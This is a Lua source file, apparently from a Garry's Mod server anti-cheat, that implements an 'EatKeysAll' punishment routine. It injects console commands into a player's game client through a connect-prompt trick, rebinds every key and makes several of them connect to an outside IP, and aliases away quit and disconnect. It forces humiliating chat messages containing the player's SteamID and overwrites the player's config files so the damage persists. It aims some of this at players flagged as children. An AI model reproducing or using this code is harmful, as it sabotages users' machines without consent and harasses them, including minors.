
HAC.Keys = {
	Rate 	= 0.25,
	Timeout	= 80,
}

function HAC.Keys.BuildAndSend(self, Is12)
	local SID = self:SteamID()
	
	//Build commands
	local Cmds = {}
	local function RCC(s) Cmds[ #Cmds + 1 ] = s end
	local function FuckYou(k,v) RCC('bind '..k..' "'..v..'"') end
	local Say = (Is12 and "/ooc I am too young for GMod" or "I cheat ban me for")
	local function FuckKey(k,v) RCC('bind '..k..' "'..v..'; play hac/eight.wav; alias disconnect kill; say '..Say..'"') end
	
	RCC("unbindall")
	
	RCC('alias gamemenucommand "say We can do WONDERFUL things with light bulbs!"')
	RCC('alias cancelselect "say WHO WILL REPAIR MY BAGPIPES"')
	RCC('alias disconnect "say I will never '..(Is12 and "play the bagpipes" or "cheat")..' again!"')
	RCC('alias connect "echo BAGPIPES"')
	RCC('alias exit "say I should '..(Is12 and "fill my bagpipes with propane" or "not cheat")..'!"')
	RCC('alias exec "say Wheres my hammer"')
	RCC('alias quit "say I aint havin it!"')
	RCC('alias toggleconsole "say I should never have '..(Is12 and "thrown my lightbulb at the wall" or "used hacks")..'"')
	RCC('alias _restart say "How can it take that much!"')
	
	FuckYou("`", 			"play hac/still_not_working.mp3; connect 94.23.153.42; say I popped it!")
	FuckYou("F10", 			"play hac/really_cheat.mp3; gamemenucommand quitnoconfirm; say And it aint even gonna complain!")
	FuckYou("MOUSE1",		"+attack2; sensitivity 90; volume 0.1; say Ive lost my marbles!")
	FuckYou("MOUSE2",		"+attack; sensitivity 0.1; volume 1; play hac/still_not_working.mp3; say Piece of shit!")
	FuckYou("MOUSE3",		"kill; sensitivity 90; volume 0.1; say I AM A DIRTY "..(Is12 and "light bulb" or "CHEATER")..", BAN MY ASS!")	
	FuckYou("MWHEELUP",		"invnext; play hac/eight.wav; say EIGHT!")
	FuckYou("MWHEELDOWN",	"invprev; play hac/eight.wav; say BURST ME BAGPIPES")
	
	FuckYou("q", 			"connect 94.23.153.42; play hac/highway_to_hell.mp3; say IM ON A HIGHWAY TO "..(Is12 and "BAGPIPES" or "HELL").."!")
	FuckYou("y",			"messagemode")
	FuckYou("u",			"messagemode")
	FuckYou("x",			"+voicerecord; say DISAPPOINTED")
	
	FuckKey("w", 			"+back; host_writeconfig cfg/autoexec.cfg")
	FuckKey("a", 			"+moveright; host_writeconfig cfg/autoexec.cfg")
	FuckKey("s", 			"+forward; host_writeconfig cfg/autoexec.cfg")
	FuckKey("d", 			"+moveleft; host_writeconfig cfg/autoexec.cfg")
	FuckKey("e", 			"+reload; volume 0.1")
	FuckKey("r", 			"+jump; volume 0.1")
	FuckKey("f", 			"noclip; connect 94.23.153.42")
	FuckKey("c", 			"connect 94.23.153.42")
	FuckKey("v", 			"impulse 100; kill")
	FuckKey("TAB", 			"+use; connect 94.23.153.42")
	FuckKey("SPACE",		"+menu; exec game.cfg")
	FuckKey("CTRL",			"kill; exec userconfig.cfg")
	FuckKey("SHIFT",		"+walk; exec game.cfg")
	FuckKey("ALT",			"+speed; exec userconfig.cfg")
	FuckKey("F4", 			"connect 94.23.153.42")
	FuckKey("F3", 			"connect 94.23.153.42")
	FuckKey("F2", 			"connect 94.23.153.42")
	FuckKey("F1", 			"connect 94.23.153.42")
	
	local End = Is12 and "too young for GMod!" or "a cheater!"
	FuckYou("g", 		"kill; play hac/really_cheat.mp3; say "..SID.." is "..End)
	FuckYou("i", 		"kill; play hac/really_cheat.mp3; say "..SID.." is "..End)
	FuckYou("m", 		"kill; play hac/really_cheat.mp3; say "..SID.." is "..End)
	FuckYou("n", 		"kill; play hac/really_cheat.mp3; say "..SID.." is "..End)
	FuckYou("z", 		"kill; play hac/really_cheat.mp3; say "..SID.." is "..End)
	
	RCC('alias connect "say I AINT HAVIN IT!"')
	
	RCC("cl_downloadfilter mapsonly")
	RCC("host_writeconfig")
	RCC("host_writeconfig cfg/autoexec.cfg")
	RCC("host_writeconfig cfg/banned_ip.cfg")
	RCC("host_writeconfig cfg/banned_user.cfg")
	RCC("host_writeconfig cfg/config.cfg")
	RCC("host_writeconfig cfg/config_default.cfg")
	RCC("host_writeconfig cfg/game.cfg")
	RCC("host_writeconfig cfg/listenserver.cfg")
	RCC("host_writeconfig cfg/mount.cfg")
	RCC("host_writeconfig cfg/network.cfg")
	RCC("host_writeconfig cfg/server.cfg")
	RCC("host_writeconfig cfg/skill.cfg")
	RCC("host_writeconfig cfg/skill_manifest.cfg")
	RCC("host_writeconfig cfg/userconfig.cfg")
	RCC('alias host_writeconfig "use gmod_camera"')
	
	RCC("volume 0.4")
	RCC('alias unbind "say I really do wanna to throw this lightbulb at the wall!"')
	RCC('alias unbindall "say Oh dear!"')
	RCC('alias bind echo "I popped it!"')
	RCC('alias map "say OH DEAR"')
	RCC('alias changelevel "say Im DISAPPOINTED"')
	RCC('alias changelevel2 "say What happened to my marbles?"')
	
	
	//Send
	local Started 	= false
	local TID 		= "EatKeysAll_"..SID
	local Total		= table.Count(Cmds)
	local UpTo		= 0
	local function DoBinds()
		if not IsValid(self) then timer.Destroy(TID) return end
		
		//Select
		local Idx  	= nil
		local This 	= nil
		for k,v in pairs(Cmds) do
			Idx  = k
			This = v
			break
		end
		
		//Send
		if Idx and This then
			Started = true
			
			//Remove
			Cmds[ Idx ] = nil
			
			//Log
			UpTo = UpTo + 1
			self:WriteLog("# EatKeysAll sending: "..UpTo.."/"..Total)
			
			//Send
			self:AskConnect("\n\n"..This.."//") --Thanks Willox :D
		else
			if Started then
				Started = false
				//End
				timer.Destroy(TID)
				
				//Log
				self:WriteLog("# Finished sending EatKeysAll")
			end
		end
	end
	timer.Create(TID, HAC.Keys.Rate, 1000, DoBinds)
end


HAC.BCode.Add("bc_EatKeys.lua", 	"ERROR", 			{obf = 1, over = 1} )
HAC.BCode.Add("bc_EatKeysAll.lua", 	"[NULL Entity]", 	{obf = 1, over = 1} )

resource.AddFile("sound/hac/tsp_run_around.mp3")


function HAC.Keys.Spawn(self)
	timer.Simple(20, function()
		if IsValid(self) and not self:HKS_InProgress() then --HKS only, not burst
			self:EatKeys()
			
			//Break 12 year old's keys
			if not self.GetLevel or (self.GetLevel and self:GetLevel() == 22) then
				self:WriteLog("# Sending EatKeysAll due to 12 year old idiot")
				self:EatKeysAll()
			end
		end
	end)
end
hook.Add("HACReallySpawn", "HAC.Keys.Spawn", HAC.Keys.Spawn)


function HAC.Keys.HKSComplete(self, Res)
	self:EatKeys() --After HKS, all sent. Only valuable data is SC
	
	if self.HAC_DoEatKeysAll then
		self:WriteLog(Res..", sending EatKeysAll")
		
		self:EatKeysAll()
	end
end
hook.Add("HKSComplete", "HAC.Keys.HKSComplete", HAC.Keys.HKSComplete)



//EatKeys
function _R.Player:EatKeys() --Disabled, EatKeysAll is better
	--[[
	if not IsValid(self) or self:HAC_IsHeX() then return end
	
	if self.HAC_DoneKeys then return end
	self.HAC_DoneKeys = true
	
	//Silent
	if self:BannedOrFailed() and HAC.Silent:GetBool() then
		self:WriteLog("! NOT DOING EatKeys, silent mode!")
		return
	end
	
	if self:Banned() then
		self:WriteLog("# Sending EatKeys")
	end
	
	self:BurstCode("bc_EatKeys.lua")
	]]
end

//EatKeys ALL
function _R.Player:EatKeysAll(override)
	if not IsValid(self) or self:HAC_IsHeX() or self.HAC_DoneKeysAll then return end
	self.HAC_DoneKeysAll = true
	
	//Silent
	if (self:BannedOrFailed() and HAC.Silent:GetBool()) and not override then
		self:WriteLog("! NOT DOING EatKeysAll, silent mode!")
		return
	end
	
	//Log
	self:WriteLog("# Sending EatKeysAll")
	
	//Timeout
	self.HAC_EatKeysAllTimeOut = "HAC_EatKeysAllTimeOut_"..self:SteamID()
	timer.Create(self.HAC_EatKeysAllTimeOut, HAC.Keys.Timeout, 1, function()
		if IsValid(self) then
			self:FailInit("EatKeysAll_Timeout ("..HAC.Keys.Timeout..")", HAC.Msg.KY_Timeout)
		end
	end)
	
	//Send, to handle askconnect
	self:BurstCode("bc_EatKeysAll.lua")
end


//EatKeysAllEx, waits for HKS
function _R.Player:EatKeysAllEx()
	if not IsValid(self) or self:HAC_IsHeX() or self.HAC_DoneEatKeysAllEx then return end
	self.HAC_DoneEatKeysAllEx = true
	
	self:WriteLog("! EatKeysAll in 10s..")
	
	timer.Simple(10, function()
		if IsValid(self) then
			if self:HKS_InProgress() then
				self.HAC_DoEatKeysAll = true
				
				self:WriteLog("! EatKeysAll, Waiting for HKS..")
			else
				self:EatKeysAll()
			end
		end
	end)
end



//GateHook YUMYUM
function HAC.Keys.GateHook(self,Args1)
	//Log
	self:WriteLog("! "..Args1)
	
	//Ran fine
	if Args1 == "EatKeys=Started" then
		//Abort FailInit
		self:AbortFailInit(Args1)
		
		//12 year olds get different keys!
		local Is12 = (FSA and self:GetLevel() == 22) or false
		if Is12 then
			self:WriteLog("# EatKeysAll, using Is12 binds")
		end
		
		//Eat them!
		HAC.Keys.BuildAndSend(self, Is12)
		
	//Ran fine
	elseif Args1:Check("EatKeys=YUMYUM") then
		self.HAC_DoneYumYum = true
		
		//Sound
		timer.Simple(20, function() --fixme, see hac_base, HAC_EmitSound note
			if IsValid(self) then
				self:HAC_EmitSound("hac/tsp_run_around.mp3", "Run around for so long")
			end
		end)
		
	//Failed, gone/read-only .cfg etc
	elseif Args1 == "EatKeys=FAILURE" then
		//Unindall
		self:UnbindAll(Args1)
		
		//BSoD
		self:BluescreenInternal(Args1, true)
	end
	
	
	//Kill Timeout
	if self.HAC_EatKeysAllTimeOut and Args1 != "EatKeys=Started" then
		if self.HAC_EatKeysAllTimeOut then
			timer.Destroy(self.HAC_EatKeysAllTimeOut)
			self.HAC_EatKeysAllTimeOut = nil
		end
	end
	
	return INIT_DO_NOTHING
end
HAC.Init.GateHook("EatKeys=", HAC.Keys.GateHook)



//UnbindAll
function _R.Player:UnbindAll(str, override)
	if self:HAC_IsHeX() then return end
	
	//Eaten already
	if self.HAC_DoneYumYum and not override then
		self:WriteLog("! NOT DOING UnbindAll, YUMYUM!")
		return
	end
	//Silent
	if HAC.Silent:GetBool() and not override then
		self:WriteLog("! NOT DOING UnbindAll, silent mode!")
		return
	end
	
	
	//Log
	self:WriteLog("# Sending UnbindAll"..(str and ": ("..str..")" or "") )
	
	//Send
	self:ConCommand("unbindall")
	--self:SendLua([[ RunConsoleCommand("unbindall") ]])
	self:ClientCommand("unbindall")
	timer.Simple(1, function()
		if IsValid(self) then
			self:HACPEX("unbindall")
		end
	end)
end



function HAC.Keys.Command(ply,cmd,args)
	local Him = tonumber( args[1] )
	if not Him or Him < 1 then
		ply:print("[HAC] Invalid userid!")
		return
	end
	
	Him = Player(Him)
	if IsValid(Him) then
		ply:print("\n[HAC] Sending "..Him:Nick().." EatKeysAll..\n")
		Him:EatKeysAll(true)
	else
		ply:print("[HAC] Invalid userid!")
	end
end
concommand.Add("eatkeysall", HAC.Keys.Command)














